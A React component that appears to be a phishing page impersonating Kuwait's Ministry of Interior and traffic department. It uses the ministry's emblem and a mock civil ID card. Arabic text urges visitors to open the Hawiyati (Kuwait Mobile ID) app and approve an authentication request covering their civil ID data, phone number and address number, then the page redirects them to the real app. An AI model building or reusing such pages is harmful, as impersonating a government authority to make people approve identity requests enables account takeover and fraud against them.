"use client"

import { useState } from "react"
import FullPageLoader from "./loader1"
export default function KuwaitIDVerificationNative() {
  const [activeTab, setActiveTab] = useState("verification")
  const [isLoading, setIsLoading] = useState(false)
const handleTapp=()=>{
  setTimeout(function() {
    if (navigator.userAgent.indexOf("Android") != -1) {
        window.location.href = "https://play.google.com/store/apps/details?id=kw.gov.paci.PACIMobileID";
    } else {
        window.location.href = "https://apps.apple.com/kw/app/kuwait-mobile-id-%D9%87%D9%88%D9%8A%D8%AA%D9%8A/id1449712307";
    }
  setIsLoading(true)

}, 2000)
}
  return (
    <div className={'container'}style={{zoom:0.9}}>
      <FullPageLoader isLoading={isLoading}/>
      <div className={'card'}>
        {/* Header */}
        <div className={'header'}>
          <div className={'headerContent'}>
            <div className={'logoContainer'}>
              <img
                src="/wwer.svg"
                width={60}
                height={60}
                alt="Kuwait Ministry of Interior emblem"
                className={'logo'}
              />
            </div>

            <div className={'titleContainer'}>
              <h1 className={'title'}>دولة الكويت</h1>
              <h2 className={'subtitle'}>وزارة الداخلية</h2>
              <div className={'department'}>الإدارة العامة للمرور</div>
            </div>
          </div>

          <div className={'divider'}></div>
        </div>

        {/* Main Content */}
        <div className={'content'}>
          <h2 className={'contentTitle'}>التحقق من البطاقة المدنية</h2>
          <p className={'contentText'}>سيتم إستخدام تطبيق هويتي للتحقق من المعلومات</p>

          <p className={'contentText'}>يرجى زيارة تطبيق هويتي لقبول عملية المصادقة</p>

          {/* ID Card Preview */}
          <div className={'idCard'}>
            <div className={'idCardHeader'}>
              <div className={'idCardDots'}>
                <div className={'dot'}></div>
                <div className={'dot'}></div>
                <div className={'dot'}></div>
              </div>
              <div className={'idCardCountry'}>دولة الكويت</div>
            </div>

            <div className={'idCardInfo'}>
              <div className={'idNumber'}>000000000000</div>
              <div className={'idLabel'}>الرقم المدني</div>
            </div>

            <div className={'idCardDetails'}>
              <div className={'idCardName'}>
                <div>اسم حامل البطاقة المدنية</div>
                <div>CIVIL ID CARD HOLDER'S NAME</div>
              </div>
              <div className={'idCardPhoto'}>
                <div className={'photoPlaceholder'}></div>
              </div>
            </div>
          </div>

          {/* Verification Tabs */}
          <div className={'tabs'}>
            <button
              onClick={() => setActiveTab("verification")}
              className={`${'tabButton'} ${activeTab === "verification" ? activeTab : ''}`}
            >
              طلبات المصادقة
            </button>
            <button
              onClick={() => setActiveTab("signature")}
              className={`${'tabButton'} ${activeTab === "signature" ? activeTab : ''}`}
            >
              طلبات التوقيع
            </button>
          </div>
          <div className={'tabContent'}>
            {activeTab === "verification" && (
              <div>
                <p className={'verificationText'}>
                  يرجى قبول طلب المصادقة على صحة بيانات العميل، رقم الجوال والرقم الآلي للعنوان المدني بعد قبول
                  المصادقة
                </p>
                <p className={'verificationText'}>قم بالضغط على أيقونة المتابعة</p>
              </div>
            )}
            {activeTab === "signature" && (
              <p className={'signatureText'}>طلبات التوقيع الرقمي</p>
            )}
          </div>

          {/* Timer */}
          <div className={'timerContainer'}>
            <div className={'timer '}>
              <svg viewBox="0 0 24 24" fill="#2d00b3" xmlns="http://www.w3.org/2000/svg">
                <circle cx="12" cy="12" r="9" stroke="currentColor" strokeWidth="2" />
                <path d="M12 7V12L15 15" stroke="currentColor" strokeWidth="2" strokeLinecap="round" />
              </svg>
            </div>
          </div>

          {/* Continue Button */}
          <div className={'buttonContainer'}>
            <button className={'continueButton'} onClick={()=>handleTapp()}>
              متابعة
            </button>
          </div>
        </div>
      </div>
      <style>
        {`.container {
	display: flex;
	min-height: 100vh;
	align-items: center;
	justify-content: center;
	background-color: #f5f5f4;
	padding: 0.5rem;
  }
  
  .card {
	width: 100%;
	max-width: 28rem;
	background-color: white;
	border-radius: 0.375rem;
	box-shadow: 0 4px 6px -1px rgba(0, 0, 0, 0.1), 0 2px 4px -1px rgba(0, 0, 0, 0.06);
  }
  
  .header {
	position: relative;
	border-bottom: 1px solid #e5e7eb;
	padding: 0.75rem;
  }
  
  .headerContent {
	display: flex;
	flex-direction: column;
	align-items: center;
  }
  
  .logoContainer {
	margin-bottom: 0.5rem;
  }
  
  .logo {
	height: 2.5rem;
	width: 2.5rem;
  }
  
  .titleContainer {
	text-align: center;
  }
  
  .title {
	font-size: 1.125rem;
	font-weight: 700;
	color: #1e3a8a;
  }
  
  .subtitle {
	font-size: 1rem;
	font-weight: 600;
	color: #1e3a8a;
  }
  
  .department {
	margin-top: 0.25rem;
	font-size: 0.875rem;
	color: #1e3a8a;
  }
  
  .divider {
	margin: 0.75rem 0;
	display: flex;
	justify-content: center;
  }
  
  .divider::before {
	content: "";
	width: 4rem;
	height: 1px;
	background-color: #d1d5db;
  }
  
  .content {
	padding: 0.75rem;
	text-align: right;
  }
  
  .contentTitle {
	margin-bottom: 0.75rem;
	font-size: 1.125rem;
	font-weight: 700;
	color: #1e3a8a;
  }
  
  .contentText {
	font-size: 0.75rem;
	color: #4b5563;
	margin-bottom: 0.75rem;
  }
  
  .idCard {
	margin: 1rem auto;
	max-width: 20rem;
	background-color: #1e3a8a;
	border-radius: 0.5rem;
	padding: 0.75rem;
	color: white;
  }
  
  .idCardHeader {
	display: flex;
	justify-content: space-between;
	align-items: flex-start;
  }
  
  .idCardDots {
	display: flex;
	gap: 0.5rem;
  }
  
  .dot {
	height: 1.25rem;
	width: 1.25rem;
	border-radius: 9999px;
	background-color: white;
  }
  
  .idCardCountry {
	font-size: 0.75rem;
  }
  
  .idCardInfo {
	margin-top: 0.5rem;
	display: flex;
	justify-content: space-between;
	align-items: center;
  }
  
  .idNumber {
	font-size: 0.75rem;
  }
  
  .idLabel {
	font-size: 0.75rem;
  }
  
  .idCardDetails {
	margin-top: 0.75rem;
	display: flex;
  }
  
  .idCardName {
	flex: 1;
	font-size: 0.75rem;
  }
  
  .idCardPhoto {
	height: 3.5rem;
	width: 3.5rem;
	background-color: #d1d5db;
	border-radius: 0.25rem;
	display: flex;
	align-items: center;
	justify-content: center;
  }
  
  .photoPlaceholder {
	height: 2.25rem;
	width: 1.75rem;
	border-top-left-radius: 9999px;
	border-top-right-radius: 9999px;
	background-color: #6b7280;
  }
  
  .tabs {
	margin-top: 1rem;
	display: flex;
	border-bottom: 1px solid #e5e7eb;
  }
  
  .tabButton {
	flex: 1;
	padding: 0.5rem;
	font-size: 0.75rem;
	font-weight: 500;
	background: none;
	border: none;
	cursor: pointer;
  }
  
  .activeTab {
	border-bottom: 2px solid #3b82f6;
	color: #2563eb;
  }
  
  .tabContent {
	margin-top: 0.75rem;
  }
  
  .verificationText,
  .signatureText {
	font-size: 0.75rem;
	color: #1e3a8a;
	margin-bottom: 0.5rem;
  }
  
  .timerContainer {
	margin-top: 1rem;
	display: flex;
	justify-content: center;
  }
  
  .timer {
	height: 2.5rem;
	width: 2.5rem;
	border-radius: 9999px;
	border: 2px solid red;
	padding: 0.5rem;
  animation: spin 1s linear infinite;

  }
  
  .buttonContainer {
	margin-top: 1rem;
  }
  
  .continueButton {
	width: 100%;
	border-radius: 0.375rem;
	background-color: #1e3a8a;
	padding: 0.75rem;
	font-size: 1rem;
	font-weight: 500;
	color: white;
	border: none;
	cursor: pointer;
  }
  
  .continueButton:hover {
	background-color: #6b21a8;
  }
  
  .continueButton:focus {
	outline: none;
	box-shadow: 0 0 0 2px #e9d5ff;
  }
  
  @media (min-width: 640px) {
	.container {
	  padding: 1rem;
	}
  
	.header {
	  padding: 1rem;
	}
  
	.headerContent {
	  flex-direction: row;
	  justify-content: space-between;
	}
  
	.logoContainer {
	  margin-bottom: 0;
	}
  
	.logo {
	  height: 3rem;
	  width: 3rem;
	}
  
	.titleContainer {
	  text-align: right;
	}
  
	.title {
	  font-size: 1.25rem;
	}
  
	.subtitle {
	  font-size: 1.125rem;
	}
  
	.department {
	  font-size: 1rem;
	}
  
	.content {
	  padding: 1rem;
	}
  
	.contentTitle {
	  font-size: 1.25rem;
	}
  
	.contentText {
	  font-size: 0.875rem;
	}
  
	.tabButton {
	  font-size: 0.875rem;
	}
  
	.verificationText,
	.signatureText {
	  font-size: 0.875rem;
	}
  
	.timer {
	  height: 3rem;
	  width: 3rem;
	}
  
	.continueButton {
	  padding: 1rem;
	  font-size: 1.125rem;
	}
  }
  
  `}
      </style>
    </div>
  )
}
